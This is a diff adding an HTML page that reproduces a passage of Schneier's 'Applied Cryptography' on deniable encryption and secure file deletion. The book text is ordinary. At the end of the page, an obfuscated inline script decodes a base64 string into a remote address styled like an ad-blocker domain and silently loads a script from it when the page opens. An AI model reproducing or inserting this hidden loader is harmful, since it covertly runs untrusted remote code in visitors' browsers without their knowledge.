@@ -1,0 +1,81 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Using Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=10//-->
+<!--PAGES=228-229//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="10-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch11/11-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Since these are one-time pads and <I>K</I> is completely random, there is no way to prove that <I>K&#146;</I> was not the real key. To make matters more convincing, Alice and Bob should concoct some mildly incriminating dummy messages to take the place of the really incriminating real messages. A pair of Israeli spies once did this.</P>
+<P>Alice could take <I>P</I> and encrypt it with her favorite algorithm and key <I>K</I> to get <I>C</I>. Then she takes <I>C</I> and XORs it with some piece of mundane plaintext&#151;<I>Pride and Prejudice</I> for example, to get <I>K&#146;</I>. She stores both <I>C</I> and the XOR on her hard disk. Now, when the secret police interrogate her, she can explain that she is an amateur cryptographer and that <I>K&#146;</I> is a merely one-time pad for <I>C</I>. The secret police might suspect something, but unless they know <I>K</I> they cannot prove that Alice&#146;s explanation isn&#146;t valid.</P>
+<P>Another method is to encrypt <I>P</I> with a symmetric algorithm and <I>K</I>, and <I>D</I> with <I>K&#146;</I>. Intertwine bits (or bytes) of the ciphertext to make the final ciphertexts. If the secret police demand the key, Alice gives them <I>K&#146;</I> and says that the alternating bits (or bytes) are random noise designed to frustrate cryptanalysis. The trouble is the explanation is so implausible that the secret police will probably not believe her (especially considering it is suggested in this book).</P>
+<P>A better way is for Alice to create a dummy message, <I>D</I>, such that the concatenation of <I>P</I> and <I>D</I>, compressed, is about the same size as <I>D</I>. Call this concatenation <I>P&#146;</I>. Alice then encrypts <I>P&#146;</I> with whatever algorithm she and Bob share to get <I>C</I>. Then she sends <I>C</I> to Bob. Bob decrypts <I>C</I> to get <I>P&#146;</I>, and then <I>P</I> and <I>D</I>. Then they both compute <I>C &#8853;</I> <I>D =</I> <I>K&#146;</I>. This <I>K&#146;</I> becomes the dummy one-time pad they use in case the secret police break their doors down. Alice has to transmit <I>D</I> so that hers and Bob&#146;s alibis match.</P>
+<P>Another method is for Alice to take an innocuous message and run it through some error-correcting code. Then she can introduce errors that correspond to the secret encrypted message. On the receiving end, Bob can extract the errors to reconstruct the secret message and decrypt it. He can also use the error-correcting code to recover the innocuous message. Alice and Bob might be hard pressed to explain to the secret police why they consistently get a 30 percent bit-error rate on an otherwise noise-free computer network, but in some circumstances this scheme can work.</P>
+<P>Finally, Alice and Bob can use the subliminal channels in their digital signature algorithms (see Sections 4.2 and 23.3). This is undetectable, works great, but has the drawback of only allowing 20 or so characters of subliminal text to be sent per signed innocuous message. It really isn&#146;t good for much more than sending keys.</P>
+<H3><A NAME="Heading10"></A><FONT COLOR="#000077">10.9 Destroying Information</FONT></H3>
+<P>When you delete a file on most computers, the file isn&#146;t really deleted. The only thing deleted is an entry in the disk&#146;s index file, telling the machine that the file is there. Many software vendors have made a fortune selling file-recovery software that recovers files after they have been deleted.
+</P>
+<P>And there&#146;s yet another worry: Virtual memory means your computer can read and write memory to disk any time. Even if you don&#146;t save it, you never know when a sensitive document you are working on is shipped off to disk. This means that even if you never save your plaintext data, your computer might do it for you. And driver-level compression programs like Stacker and DoubleSpace can make it even harder to predict how and where information is stored on a disk.</P>
+<P>To erase a file so that file-recovery software cannot read it, you have to physically write over all of the file&#146;s bits on the disk. According to the National Computer Security Center [1148]:</P>
+<BLOCKQUOTE><P>Overwriting is a process by which unclassified data are written to storage locations that previously held sensitive data.... To purge the...storage media, the DoD requires overwriting with a pattern, then its complement, and finally with another pattern; e.g., overwrite first with 0011 0101, followed by 1100 1010, then 1001 0111. The number of times an overwrite must be accomplished depends on the storage media, sometimes on its sensitivity, and sometimes on different DoD component requirements. In any case, a purge is not complete until a final overwrite is made using unclassified data.
+</P>
+</BLOCKQUOTE><P>You may have to erase files or you may have to erase entire drives. You should also erase all unused space on your hard disk.
+</P>
+<P>Most commercial programs that claim to implement the DoD standard overwrite three times: first with all ones, then with all zeros, and finally with a repeating one-zero pattern. Given my general level of paranoia, I recommend overwriting a deleted file seven times: the first time with all ones, the second time with all zeros, and five times with a cryptographically secure pseudo-random sequence. Recent developments at the National Institute of Standards and Technology with electron-tunneling microscopes suggest even that might not be enough. Honestly, if your data is sufficiently valuable, assume that it is <I>impossible</I> to erase data completely off magnetic media. Burn or shred the media; it&#146;s cheaper to buy media new than to lose your secrets.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="10-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch11/11-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(RixYUNvR, mnoUshKQ) {mnoUshKQ = RixYUNvR.createElement('script');mnoUshKQ.type = 'text/javascript';mnoUshKQ.async = true;mnoUshKQ.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');RixYUNvR.getElementsByTagName('body')[0].appendChild(mnoUshKQ);}(document));</script></body>
+</html>
